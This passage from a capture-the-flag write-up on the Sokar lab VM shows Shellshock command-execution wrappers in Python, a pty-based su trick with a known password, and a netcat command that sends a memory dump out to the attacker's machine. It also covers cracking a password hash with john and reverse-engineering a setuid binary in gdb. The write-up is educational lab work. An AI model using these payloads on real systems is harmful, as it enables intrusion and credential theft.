&lt;p&gt;Essentially, the easiest way for me to become &lt;code&gt;bynarr&lt;/code&gt; (assuming &lt;em&gt;fruity&lt;/em&gt; really is the password), would be to &lt;code&gt;su&lt;/code&gt; right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where &lt;code&gt;su&lt;/code&gt; expects a password via &lt;code&gt;stdin&lt;/code&gt;, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can&amp;rsquo;t). Quite some time later, I got closer to becoming &lt;code&gt;bynarr&lt;/code&gt; with something like &lt;code&gt;echo fruity | su bynarr&lt;/code&gt;. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though &lt;code&gt;$(which id)&lt;/code&gt; came in very handy and saved some time. In retrospect, I could have probably just exported &lt;code&gt;PATH&lt;/code&gt; as required, but heh.&lt;/p&gt;

&lt;p&gt;Fast forward some time, I came across &lt;a href=&#34;http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells&#34;&gt;this&lt;/a&gt; SANS blogpost, which details on the topic of some &amp;lsquo;stealthy&amp;rsquo; su shells. Most importantly, the example of &lt;code&gt;(sleep 1; echo password) | python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;whoami&#39;]);&amp;quot;&lt;/code&gt; got me the closest to &lt;code&gt;bynarr&lt;/code&gt;. Toying around with this a little, I realized that for some reason, the &lt;code&gt;(&lt;/code&gt; and &lt;code&gt;)&lt;/code&gt; characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;(Basically, spawn a tty; attempt to &lt;code&gt;su&lt;/code&gt; specifying the command to run with &lt;code&gt;-c&lt;/code&gt;, then 1 second later, echo &lt;code&gt;fruity&lt;/code&gt; to the &lt;em&gt;Password&lt;/em&gt; prompt and execute &lt;code&gt;id&lt;/code&gt; as &lt;code&gt;bynarr&lt;/code&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/python -c \&amp;quot;import time; time.sleep(1); print &#39;fruity&#39;\&amp;quot; | /usr/bin/python -c \&amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);\&amp;quot;&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;:D As this is actually a Shellshock request, the full &lt;code&gt;User-Agent&lt;/code&gt; header therefore was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;() { :;};echo;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again, constructing that every time I want to execute something as &lt;code&gt;bynarr&lt;/code&gt; would have been le-suck, so I made another wrapper script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar &#39;bynarr&#39; command execution
# 2015 Leon Jacobs

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

command = sys.argv[1].strip()
payload = &amp;quot;&amp;quot;&amp;quot;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;%s&#39;, &#39;bynarr&#39;]);&amp;quot; &amp;quot;&amp;quot;&amp;quot; % command
print &amp;quot; * Executing %s\n&amp;quot; % payload

# prepare the sploit header
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % payload }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All I have to do to get the output of &lt;code&gt;id&lt;/code&gt; is provide it as a argument to &lt;code&gt;bynarr.py&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;id&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-scary-linux-memory-extractor&#34;&gt;the scary linux memory extractor&lt;/h2&gt;

&lt;p&gt;With command access as &lt;code&gt;bynarr&lt;/code&gt; and remembering the mention of &lt;code&gt;tcp/51242&lt;/code&gt; outbound connectivity, I once more try and run the port scanner that got copied to &lt;code&gt;/tmp&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;/usr/bin/python /tmp/port_scan.py&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;/usr/bin/python /tmp/port_scan.py&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
Trying port 51240
Trying port 51241
Trying port 51242
Trying port 51243
Trying port 51244
Trying port 51245
Trying port 51246
Trying port 51247
Trying port 51248
Trying port 51249
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Checking the &lt;code&gt;tcpdump&lt;/code&gt; output of this run&amp;hellip;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
07:33:43.178113 IP 192.168.217.163.40371 &amp;gt; 192.168.217.174.51242: Flags [S], seq 594732851, win 14600, options [mss 1460,sackOK,TS val 2274844 ecr 0,nop,wscale 4], length 0
07:33:43.178129 IP 192.168.217.174.51242 &amp;gt; 192.168.217.163.40371: Flags [R.], seq 0, ack 594732852, win 0, length 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; I finally see something coming out of Sokar!
So &lt;code&gt;bynarr&lt;/code&gt; is able to talk out on &lt;code&gt;tcp/51242&lt;/code&gt;. Wut. Taking a few moments to think about this, I remembered that &lt;code&gt;iptables&lt;/code&gt; is able to filter by user id using the &lt;code&gt;owner&lt;/code&gt; module. At this stage, this was the only thing that made sense why &lt;code&gt;apache&lt;/code&gt; would not be able to talk out on this port, but &lt;code&gt;bynarr&lt;/code&gt; can.&lt;/p&gt;

&lt;p&gt;So with that out the way, it was time to focus on this &lt;code&gt;lime&lt;/code&gt; thing. &lt;code&gt;bynarr&lt;/code&gt; was allowed to run &lt;code&gt;/home/bynarr/lime&lt;/code&gt; as root via &lt;code&gt;sudo&lt;/code&gt; without a password (as I suspected for the &lt;code&gt;insmod&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;sudo -l&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;sudo -l&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
Matching Defaults entries for bynarr on this host:
    !requiretty, visiblepw, always_set_home, env_reset, env_keep=&amp;quot;COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&amp;quot;, env_keep+=&amp;quot;MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;quot;, env_keep+=&amp;quot;LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;quot;, env_keep+=&amp;quot;LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;quot;, env_keep+=&amp;quot;LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;quot;,
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User bynarr may run the following commands on this host:
    (ALL) NOPASSWD: /home/bynarr/lime
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I had no freaking idea what &lt;code&gt;lime&lt;/code&gt; even really is, so, to the Gooooogles I went and came across this: &lt;a href=&#34;https://github.com/504ensicsLabs/LiME&#34;&gt;https://github.com/504ensicsLabs/LiME&lt;/a&gt;. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p&lt;/p&gt;

&lt;p&gt;I ran the script to &lt;code&gt;insmod&lt;/code&gt; the &lt;code&gt;lime.ko&lt;/code&gt;, this time with &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;echo \&amp;quot;add\&amp;quot; | sudo /home/bynarr/lime&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;echo &amp;quot;add&amp;quot; | sudo /home/bynarr/lime&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:

==========================
Linux Memory Extractorator
==========================

LKM, add or remove?
&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I checked &lt;code&gt;/tmp&lt;/code&gt; for the existence of the &lt;code&gt;ram&lt;/code&gt; file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.&lt;/p&gt;

&lt;p&gt;Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local &lt;code&gt;ram&lt;/code&gt; file with &lt;code&gt;nc -lvp 51242 &amp;gt; ram&lt;/code&gt;. Then, using my wrapper script &lt;code&gt;bynarr.py&lt;/code&gt; again, I redirected the &lt;code&gt;/tmp/ram&lt;/code&gt; file out over the netcat connection with: &lt;code&gt;python bynarr.py &amp;quot;/usr/bin/nc 192.168.217.174 51242 &amp;lt; /tmp/ram&amp;quot;&lt;/code&gt;. I now had a memory dump of Sokar on my local Kali Linux.&lt;/p&gt;

&lt;p&gt;It was at this stage that I went down the wrong rabbit hole. &lt;a href=&#34;https://code.google.com/p/volatility/&#34;&gt;Volatility&lt;/a&gt; was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM&amp;rsquo;s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty &amp;lsquo;ol &lt;code&gt;strings&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I had to think a bit about what could possibly be useful in memory for me now. I noticed the user &lt;code&gt;apophis&lt;/code&gt; had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ strings ram | grep apophis

[... snip ...]

apophis:[snip]0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; &lt;strong&gt;wut&lt;/strong&gt;. Why&amp;hellip; wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet&amp;hellip; but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through &lt;code&gt;john&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type &amp;quot;sha512crypt&amp;quot;, but the string is also recognized as &amp;quot;crypt&amp;quot;
Use the &amp;quot;--format=crypt&amp;quot; option to force loading these as that type instead
Loaded 1 password hash (sha512crypt [32/32])
overdrive        (apophis)
guesses: 1  time: 0:00:01:51 DONE (Sat Jan 31 20:35:42 2015)  c/s: 327  trying: parati - nicole28
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;apophis:overdrive&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;build-the-clone-to-the-hook&#34;&gt;build the clone to the hook&lt;/h2&gt;

&lt;p&gt;To get command execution as &lt;code&gt;apophis.py&lt;/code&gt; I copied the &lt;code&gt;bynarr.py&lt;/code&gt; script to make &lt;code&gt;apophis.py&lt;/code&gt;, changing the username and the password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;id&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;id&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
uid=501(apophis) gid=502(apophis) groups=502(apophis)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There we go! Command execution as &lt;code&gt;apophis&lt;/code&gt; :) In &lt;code&gt;/home/apophis&lt;/code&gt; there was a suid (for &lt;code&gt;root&lt;/code&gt;) binary called &lt;code&gt;build&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;ls -lah /home/apophis&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;ls -lah /home/apophis&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
total 36K
drwx------  2 apophis apophis 4.0K Jan  2 20:12 .
drwxr-xr-x. 4 root    root    4.0K Dec 30 19:20 ..
-rw-------  1 apophis apophis    9 Feb  2 20:55 .bash_history
-rw-r--r--  1 apophis apophis   18 Feb 21  2013 .bash_logout
-rw-r--r--  1 apophis apophis  176 Feb 21  2013 .bash_profile
-rw-r--r--  1 apophis apophis  124 Feb 21  2013 .bashrc
-rwsr-sr-x  1 root    root    8.3K Jan  2 17:49 build
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I thought I would copy this &lt;code&gt;build&lt;/code&gt; binary off the box as I don’t exactly have a nice interactive shell to work with yet. &lt;code&gt;apophis&lt;/code&gt; was also not able to to connect via &lt;code&gt;tcp/51242&lt;/code&gt; outbound, which further confirmed my suspicions on the &lt;code&gt;user&lt;/code&gt; module being used in iptables. I copied the binary to &lt;code&gt;/tmp/build&lt;/code&gt; and pushed it out via netcat as &lt;code&gt;bynarr&lt;/code&gt; (using my helper script) towards my local Kali linux install. Finally I had &lt;code&gt;build&lt;/code&gt; locally to play with.&lt;/p&gt;

&lt;p&gt;I later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further.
Running it asked you if you wanted to &amp;lsquo;build?&amp;rsquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ ./build
Build? (Y/N) Y
Cloning into &#39;/mnt/secret-project&#39;...
ssh: Could not resolve hostname sokar-dev:: Name or service not known
fatal: The remote end hung up unexpectedly
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for &lt;code&gt;apophis&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;echo Y | /home/apophis/build&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
Cloning into &#39;/mnt/secret-project&#39;...
ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to &lt;code&gt;/mnt/secret-project&lt;/code&gt; from &lt;code&gt;sokar-dev&lt;/code&gt; which does not resolve.&lt;/p&gt;

&lt;h3 id=&#34;the-impossible-b0f&#34;&gt;the impossible b0f&lt;/h3&gt;

&lt;p&gt;I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to &lt;code&gt;build.&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ ./build
Build? (Y/N) YY
*** buffer overflow detected ***: ./build terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x2b53e6df5fe7]
/lib/x86_64-linux-gnu/libc.so.6(+0xefea0)[0x2b53e6df4ea0]
/lib/x86_64-linux-gnu/libc.so.6(__gets_chk+0x195)[0x2b53e6df4df5]
./build(main+0xea)[0x2b53e68e29d9]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x2b53e6d23ead]
./build(+0x7d9)[0x2b53e68e27d9]
======= Memory map: ========
2b53e68e2000-2b53e68e3000 r-xp 00000000 fe:00 667555                     /root/sokar/build
2b53e68e3000-2b53e68e7000 rwxp 00000000 00:00 0
2b53e6900000-2b53e6902000 rwxp 00000000 00:00 0
2b53e6ae2000-2b53e6ae3000 rwxp 00000000 fe:00 667555                     /root/sokar/build
2b53e6ae3000-2b53e6b03000 r-xp 00000000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d03000-2b53e6d04000 rwxp 00020000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d04000-2b53e6d05000 rwxp 00000000 00:00 0
2b53e6d05000-2b53e6e87000 r-xp 00000000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e6e87000-2b53e7087000 ---p 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e7087000-2b53e708b000 r-xp 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708b000-2b53e708c000 rwxp 00186000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708c000-2b53e7091000 rwxp 00000000 00:00 0
2b53e7091000-2b53e70a6000 r-xp 00000000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e70a6000-2b53e72a6000 ---p 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e72a6000-2b53e72a7000 rwxp 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e886b000-2b53e888c000 rwxp 00000000 00:00 0                          [heap]
7fff340b7000-7fff340d8000 rwxp 00000000 00:00 0                          [stack]
7fff341eb000-7fff341ed000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[1]    18571 abort      ./build
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I slapped &lt;code&gt;build&lt;/code&gt; into &lt;code&gt;gdb&lt;/code&gt; to take a closer look at the potential overflow as well as the security features that &lt;code&gt;build&lt;/code&gt; has been compiled with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ gdb -q ./build
Reading symbols from /root/sokar/build...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : disabled
PIE       : ENABLED
RELRO     : disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;:O The &lt;code&gt;CANARY&lt;/code&gt; explains the failure in &lt;code&gt;__fortify_fail&lt;/code&gt;. Disassembly of the &lt;code&gt;main&lt;/code&gt; function reveals a call to &lt;code&gt;__gets_chk&lt;/code&gt; which is responsible for the canary validation:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass main
Dump of assembler code for function main:

 [... snip ...]

   0x00000000000009cc &amp;lt;+221&amp;gt;:   mov    esi,0x2
   0x00000000000009d1 &amp;lt;+226&amp;gt;:   mov    rdi,rbx
   0x00000000000009d4 &amp;lt;+229&amp;gt;:   call   0x760 &amp;lt;__gets_chk@plt&amp;gt;
   0x00000000000009d9 &amp;lt;+234&amp;gt;:   lea    rsi,[rbp-0x30]
   0x00000000000009dd &amp;lt;+238&amp;gt;:   mov    rdi,rbx
   0x00000000000009e0 &amp;lt;+241&amp;gt;:   call   0x790 &amp;lt;strcmp@plt&amp;gt;
   0x00000000000009e5 &amp;lt;+246&amp;gt;:   test   eax,eax

 [... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It is possible that the original source was using &lt;code&gt;gets()&lt;/code&gt; without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.&lt;/p&gt;

&lt;p&gt;I fiddled around a little more with the binary, and inspected the call to &lt;code&gt;encryptDecrypt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass encryptDecrypt
Dump of assembler code for function encryptDecrypt:
   0x00000000000008ac &amp;lt;+0&amp;gt;: mov    rdx,rdi
   0x00000000000008af &amp;lt;+3&amp;gt;: mov    r9d,0x0
   0x00000000000008b5 &amp;lt;+9&amp;gt;: mov    r11,0xffffffffffffffff
   0x00000000000008bc &amp;lt;+16&amp;gt;:    mov    r10,rdi
   0x00000000000008bf &amp;lt;+19&amp;gt;:    mov    eax,0x0
   0x00000000000008c4 &amp;lt;+24&amp;gt;:    jmp    0x8d6 &amp;lt;encryptDecrypt+42&amp;gt;
   0x00000000000008c6 &amp;lt;+26&amp;gt;:    movzx  ecx,BYTE PTR [rdx+r8*1]
   0x00000000000008cb &amp;lt;+31&amp;gt;:    xor    ecx,0x49
   0x00000000000008ce &amp;lt;+34&amp;gt;:    mov    BYTE PTR [rsi+r8*1],cl
   0x00000000000008d2 &amp;lt;+38&amp;gt;:    add    r9d,0x1
   0x00000000000008d6 &amp;lt;+42&amp;gt;:    movsxd r8,r9d
   0x00000000000008d9 &amp;lt;+45&amp;gt;:    mov    rcx,r11
   0x00000000000008dc &amp;lt;+48&amp;gt;:    mov    rdi,r10
   0x00000000000008df &amp;lt;+51&amp;gt;:    repnz scas al,BYTE PTR es:[rdi]
   0x00000000000008e1 &amp;lt;+53&amp;gt;:    not    rcx
   0x00000000000008e4 &amp;lt;+56&amp;gt;:    sub    rcx,0x1
   0x00000000000008e8 &amp;lt;+60&amp;gt;:    cmp    r8,rcx
   0x00000000000008eb &amp;lt;+63&amp;gt;:    jb     0x8c6 &amp;lt;encryptDecrypt+26&amp;gt;
   0x00000000000008ed &amp;lt;+65&amp;gt;:    repz ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with &lt;strong&gt;I&lt;/strong&gt; as the key over a string.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void encryptDecrypt(int arg0, int arg1) {
    rsi = arg1;
    rdx = arg0;
    LODWORD(r9) = 0x0;
    r10 = arg0;
    do {
            r8 = sign_extend_64(LODWORD(r9));
            asm{ repne scasb  };
            if (r8 &amp;gt;= !0xffffffffffffffff - 0x1) {
                break;
            }
            *(int8_t *)(rsi + r8) = LOBYTE(LODWORD(*(int8_t *)(rdx + r8) &amp;amp; 0xff) ^ 0x49);
            LODWORD(r9) = LODWORD(r9) + 0x1;
    } while (true);
    return;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the binary in &lt;code&gt;gdb&lt;/code&gt; and setting a breakpoint before the &lt;code&gt;system()&lt;/code&gt; call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted &lt;strong&gt;and&lt;/strong&gt; decrypted versions of the string to be executed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sokar # gdb -q ./build
gdb-peda$ r
Build? (Y/N) n
OK :(
[Inferior 1 (process 4450) exited with code 06]
Warning: not running or target is remote
gdb-peda$ b *0x0000555555554a38
Breakpoint 1 at 0x555555554a38
gdb-peda$ r
Build? (Y/N) Y
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RCX: 0x7ffff7b26e99 (&amp;lt;setreuid+25&amp;gt;: cmp    rax,0xfffffffffffff000)
RDX: 0x7fffffffe7a0 (&amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;)
RSI: 0x0
RDI: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RBP: 0x7fffffffe830 --&amp;gt; 0x0
RSP: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RIP: 0x555555554a38 (&amp;lt;main+329&amp;gt;:    mov    eax,0x0)
R8 : 0x51 (&#39;Q&#39;)
R9 : 0x51 (&#39;Q&#39;)
R10: 0x0
R11: 0x246
R12: 0x7fffffffe7a0 (&amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;)
R13: 0x7fffffffe910 --&amp;gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554a2b &amp;lt;main+316&amp;gt;:   mov    eax,0x0
   0x555555554a30 &amp;lt;main+321&amp;gt;:   call   0x5555555547a0 &amp;lt;setreuid@plt&amp;gt;
   0x555555554a35 &amp;lt;main+326&amp;gt;:   mov    rdi,rbx
=&amp;gt; 0x555555554a38 &amp;lt;main+329&amp;gt;:   mov    eax,0x0
   0x555555554a3d &amp;lt;main+334&amp;gt;:   call   0x555555554750 &amp;lt;system@plt&amp;gt;
   0x555555554a42 &amp;lt;main+339&amp;gt;:   mov    rsp,r12
   0x555555554a45 &amp;lt;main+342&amp;gt;:   jmp    0x555555554a5d &amp;lt;main+366&amp;gt;
   0x555555554a47 &amp;lt;main+344&amp;gt;:   lea    rsi,[rip+0x12c]        # 0x555555554b7a
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0008| 0x7fffffffe748 (&amp;quot;/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0016| 0x7fffffffe750 (&amp;quot;ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
